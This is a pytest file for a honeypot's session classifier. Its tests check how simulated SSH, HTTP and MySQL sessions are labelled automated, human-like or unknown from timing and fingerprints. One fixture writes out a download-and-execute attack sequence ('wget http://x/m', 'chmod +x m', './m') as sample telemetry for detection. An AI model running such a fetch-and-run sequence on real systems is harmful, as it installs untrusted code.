"""Session classifier heuristics (Phase 4). Pure-logic tests with fakes."""

from __future__ import annotations

import datetime as dt
from types import SimpleNamespace

from deceptinet.telemetry.classifier import classify_session

_BASE = dt.datetime(2026, 1, 1, tzinfo=dt.timezone.utc)


def _ev(secs: float, cmd: str, etype: str = "command", meta=None):
    return SimpleNamespace(
        event_type=etype, ts=_BASE + dt.timedelta(seconds=secs), command=cmd,
        meta=meta or {}, response=None,
    )


def _sess(service="ssh", term=None, cv=None):
    return SimpleNamespace(service=service, term_type=term, client_version=cv)


def test_automated_fast_regular_no_pty():
    events = [
        _ev(i * 0.1, c)
        for i, c in enumerate(["uname -a", "cat /proc/cpuinfo", "wget http://x/m", "chmod +x m", "./m"])
    ]
    r = classify_session(_sess(cv="SSH-2.0-libssh2_1.10.0"), events, [])
    assert r.label == "automated"
    assert r.confidence > 0.6
    assert any("fingerprint" in reason for reason in r.reasons)


def test_human_like_slow_irregular_with_pty():
    times = [0, 3.2, 8.1, 12.7, 20.3]
    cmds = ["ls", "cd /var/www", "cat config.php", "vi app.py", "whoami"]
    events = [_ev(t, c) for t, c in zip(times, cmds)]
    r = classify_session(_sess(term="xterm-256color", cv="SSH-2.0-OpenSSH_8.9p1"), events, [])
    assert r.label != "automated"
    assert r.features["n_commands"] == 5


def test_no_commands_is_unknown():
    r = classify_session(_sess(cv="SSH-2.0-OpenSSH_8.9p1"), [], [])
    assert r.label == "unknown"
    assert r.confidence < 0.3


def test_scanner_probe_no_commands_but_fingerprint():
    r = classify_session(_sess(cv="SSH-2.0-zgrab"), [], [])
    assert r.label == "automated"


def test_http_scanner_user_agent_is_automated():
    events = [_ev(0, "GET /", etype="http_request", meta={"user_agent": "sqlmap/1.5"})]
    r = classify_session(_sess(service="http"), events, [])
    # A definitive scanner UA dominates even with a single request.
    assert r.features["scanner_fingerprint"] == "sqlmap"
    assert r.label == "automated"
    assert r.confidence >= 0.8


def test_low_signal_is_unknown_not_confident_human():
    # A single MySQL query with no fingerprint/timing must NOT be confidently human.
    events = [_ev(0, "show databases", etype="mysql_query")]
    r = classify_session(_sess(service="mysql"), events, [])
    assert r.label in ("unknown", "semi_interactive")
    assert r.confidence <= 0.4
